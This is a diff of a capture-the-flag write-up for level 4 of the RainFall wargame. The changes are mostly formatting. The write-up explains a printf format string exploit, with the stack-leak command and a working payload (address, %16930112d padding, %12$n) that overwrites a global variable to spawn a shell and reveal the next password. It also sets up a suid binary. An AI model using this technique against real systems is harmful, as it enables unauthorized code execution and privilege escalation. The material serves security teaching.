@@ -49,6 +49,8 @@ If true a call to system() launches a shell.
 
 Let's use the printf() format string exploit to change the value of variable ```m``` to ```0x1025544```.
 
+### Find %n address
+
 First let's print the stack to find the address of the variable we wish to modify.
 ```
 level4@RainFall:~$ (python -c 'print "BBBB" + " %x" * 13' ; cat -) | ./level4
@@ -59,10 +61,12 @@ We find buffer BBBB (42424242) in 12th position.
 Our target value ```16930116``` is too long for the ```%n``` exploit as used in the last level (%n stores only 4 bytes).
 However, we can dynamically specify field width with modifier ```%d```  e.g. ```%16930116d```.
 
+### Build exploit string
+
 So we build our format string exploit:
-1. Address of glabal variable ```m``` (4 bytes)          - "\x10\x98\x04\x08"
-2. 16930112 bytes padding using ```%d```                 - "%16930112d"
-3. store n bytes printed in 12th argument with ```%n```  - "%12$n"
+1. Address of glabal variable ```m``` (4 bytes)          - ```\x10\x98\x04\x08```
+2. 16930112 bytes padding using ```%d```                 - ```%16930112d```
+3. store n bytes printed in 12th argument with ```%n```  - ```%12$n```
 
 When we feed our format string attack to the binary it opens a shell and shows us the level5 password.
 ```
@@ -74,7 +78,7 @@ level4@RainFall:~$ (python -c 'print "\x10\x98\x04\x08" + "%16930112d" + "%12$n"
 
 ## Recreate Exploited Binary
 
-As user level5, in /tmp, create and compile level4_source.c.
+As user ```level5```, in ```/tmp```, create and compile ```level4_source.c```.
 ```
 level5@RainFall:/tmp$ gcc level4_source.c -fno-stack-protector -o level4_source
 ```
@@ -82,7 +86,7 @@ Edit permissions including suid, then move the binary to home directory.
 ```
 level5@RainFall:/tmp$ chmod u+s level4_source; chmod +wx ~; mv level4_source ~
 ```
-Exit back to user level4, then run the source with an updated address of global variable ```m```.
+Exit back to user ```level4```, then run the source with an updated address of global variable ```m```.
 ```
 level5@RainFall:/tmp$ exit
 exit
